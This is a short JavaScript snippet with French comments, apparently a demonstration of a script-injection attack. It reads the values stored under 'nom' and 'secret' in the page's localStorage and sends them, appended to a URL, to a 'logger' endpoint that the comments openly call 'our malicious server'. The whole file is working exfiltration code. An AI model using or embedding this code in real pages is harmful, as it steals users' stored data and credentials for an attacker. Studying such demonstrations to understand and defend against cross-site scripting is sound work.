// On récupère l'URL de ce script
// (la dernière balise <script> ajoutée à la page)
var moi = document.scripts[document.scripts.length-1].src;

// On compose l'url qui va sniffer le localStorage
var url = moi + '../logger?' + localStorage.nom + '|' + localStorage.secret;

// On envoie la requête à notre serveur malveillant
// inutile d'attacher un gestionnaire à onload: la réponse ne nous intéresse
// pas
var xhr = new XMLHttpRequest();
xhr.open('get', url);
xhr.send();
